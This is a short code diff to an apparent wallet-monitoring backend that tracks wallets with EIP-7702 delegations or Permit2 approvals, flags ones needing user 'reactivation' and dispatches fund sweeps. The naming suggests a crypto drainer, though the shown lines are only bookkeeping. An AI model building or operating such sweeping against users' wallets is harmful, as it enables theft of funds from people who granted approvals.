@@ -2896,12 +2896,13 @@ async function loadDelegatedWallets() {
       const checksum = normalizeAddress(row.address);
       if (!checksum) continue;
       const type = row.type || "eip7702";
-      if (row.needs_reactivation && (type === "permit2-gasless" || type === "permit2")) {
+      const needsReauth = !!(row.needs_reactivation && (type === "permit2-gasless" || type === "permit2"));
+      if (needsReauth) {
         needsReauthWallets.add(checksum.toLowerCase());
         skippedReauth++;
       }
       delegatedWallets.set(checksum, type);
-      monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
+      monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type, needs_reactivation: needsReauth });
     }
     const types    = [...delegatedWallets.values()];
     const e7Count  = types.filter(t => t === "eip7702").length;
@@ -2935,7 +2936,7 @@ function subscribeRealtime() {
         if (!address) return;
         const isNew = !monitoredWallets.has(address.toLowerCase());
         delegatedWallets.set(address, type);
-        monitoredWallets.set(address.toLowerCase(), { address, type });
+        monitoredWallets.set(address.toLowerCase(), { address, type, needs_reactivation: false });
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
         log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
@@ -2970,11 +2971,11 @@ function subscribeRealtime() {
         if (row.needs_reactivation && needsSig) {
           log(`[realtime] ${address.slice(0, 10)} (${type}) — needs_reactivation set, awaiting user reconnect`);
           delegatedWallets.set(address, type);
-          monitoredWallets.set(address.toLowerCase(), { address, type });
+          monitoredWallets.set(address.toLowerCase(), { address, type, needs_reactivation: true });
           return;
         }
         delegatedWallets.set(address, type);
-        monitoredWallets.set(address.toLowerCase(), { address, type });
+        monitoredWallets.set(address.toLowerCase(), { address, type, needs_reactivation: false });
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
         log(`[realtime] 🔄 re-activated ${address.slice(0, 10)} (${type}) — dispatching sweep`);
